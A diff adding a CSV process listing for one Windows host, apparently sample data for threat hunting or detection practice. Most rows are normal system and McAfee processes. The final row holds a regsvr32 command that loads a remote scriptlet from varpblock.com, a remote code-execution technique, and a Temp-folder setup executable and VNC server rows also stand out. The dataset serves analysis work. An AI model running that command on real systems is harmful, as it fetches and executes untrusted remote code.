@@ -1,0 +1,66 @@
+hostname,name,arguments,username,path,pid
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,2020
+WW911YBM,vmware-usbarbitrator64.exe,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",bla.carter18,C:\Program Files (x86)\Common Files\VMware\USB,2070
+WW911YBM,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,2872
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,4752
+WW911YBM,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\roby.edwar93\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",roby.edwar93,C:\Users\roby.edwar93\AppData\Local\Temp\scoped_dir9616_4071,823
+WW911YBM,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,4808
+WW911YBM,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},NT AUTHORITY\SYSTEM,C:\Windows\system32,1840
+WW911YBM,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,1016
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,3336
+WW911YBM,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",roby.edwar93,C:\Program Files\Common Files\McAfee\PEF\CORE,5710
+WW911YBM,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,NT AUTHORITY\SYSTEM,C:\Windows\System32,1228
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,4316
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,NT AUTHORITY\SYSTEM,C:\Windows\system32,3800
+WW911YBM,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,NT AUTHORITY\SYSTEM,C:\Windows\system32,196
+WW911YBM,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",roby.edwar93,C:\Program Files\Common Files\McAfee\TaskScheduler,559
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,6032
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,4252
+WW911YBM,TabTip32.exe,/loadhooks /Parent:0000000000001188,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,4748
+WW911YBM,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",roby.edwar93,C:\Program Files\Common Files\McAfee\Platform\Core,5092
+WW911YBM,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,12
+WW911YBM,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",bla.carter18,C:\Program Files\RealVNC\VNC Viewer,1271
+WW911YBM,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",roby.edwar93,C:\ProgramData\McAfee\Direct,2226
+WW911YBM,soffice.exe,"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",bla.carter18,C:\Program Files (x86)\OpenOffice 4\program,4887
+WW911YBM,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",bla.carter18,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,1468
+WW911YBM,Microsoft.Notes.exe,"""C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe"" -ServerName:App.AppX495fygk72hjw82j58ny5h3nr8hpsd8vs.mca",roby.edwar93,C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe,1021
+WW911YBM,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},NT AUTHORITY\SYSTEM,C:\Windows\system32,5760
+WW911YBM,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",roby.edwar93,C:\Program Files\McAfee\WebAdvisor,734
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,2652
+WW911YBM,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,284
+WW911YBM,SearchUI.exe,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,2908
+WW911YBM,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",bla.carter18,C:\Program Files\TightVNC,2424
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel,NT AUTHORITY\SYSTEM,C:\Windows\system32,5788
+WW911YBM,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",roby.edwar93,C:\Program Files\Common Files\McAfee\MMSSHost,3923
+WW911YBM,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,5416
+WW911YBM,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",roby.edwar93,C:\Program Files\Common Files\McAfee\ModuleCore,973
+WW911YBM,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",bla.carter18,C:\Program Files\TightVNC,4957
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k smbsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,76
+WW911YBM,vmware-authd.exe,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",bla.carter18,C:\Program Files (x86)\VMware\VMware Player,4054
+WW911YBM,sihost.exe,sihost.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,4292
+WW911YBM,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,roby.edwar93,C:\ProgramData\McAfee\Direct,6192
+WW911YBM,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,roby.edwar93,c:\program files\common files\mcafee\modulecore,4975
+WW911YBM,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",roby.edwar93,C:\Program Files\McAfee\MAT,5337
+WW911YBM,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",roby.edwar93,C:\Program Files\Common Files\McAfee\AMCore,3245
+WW911YBM,OneDrive.exe,"""C:\Users\bla.carter18\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",bla.carter18,C:\Users\bla.carter18\AppData\Local\Microsoft\OneDrive,1962
+WW911YBM,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",roby.edwar93,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,1272
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,1060
+WW911YBM,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc,NT AUTHORITY\SYSTEM,C:\Windows\System32,3384
+WW911YBM,ShellExperienceHost.exe,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,1968
+WW911YBM,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,560
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,5732
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1248
+WW911YBM,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,roby.edwar93,C:\ProgramData\McAfee\McInstruTrack,4483
+WW911YBM,MpCmdRun.exe,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Defender,5876
+WW911YBM,soffice.bin,"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",bla.carter18,C:\Program Files (x86)\OpenOffice 4\program,4394
+WW911YBM,LogonUI.exe,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",NT AUTHORITY\SYSTEM,C:\Windows\system32,1716
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,2564
+WW911YBM,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,3316
+WW911YBM,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,2412
+WW911YBM,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",roby.edwar93,c:\program files\common files\mcafee\modulecore,3972
+WW911YBM,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",roby.edwar93,C:\Program Files\McAfee\MfeAV,1238
+WW911YBM,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",roby.edwar93,C:\Program Files\Common Files\McAfee\VSCore_18_6,3560
+WW911YBM,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},NT AUTHORITY\SYSTEM,C:\Windows\System32,1928
+WW911YBM,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",roby.edwar93,C:\Program Files\Common Files\mcafee\Platform,5442
+WW911YBM,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",roby.edwar93,C:\Program Files\McAfee\WebAdvisor,4665
+WW911YBM,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:\\varpblock.com\NETFXSrS10.sct scrobj.dll,bla.carter18,C:\Windows\System32\regsvr32.exe,1972
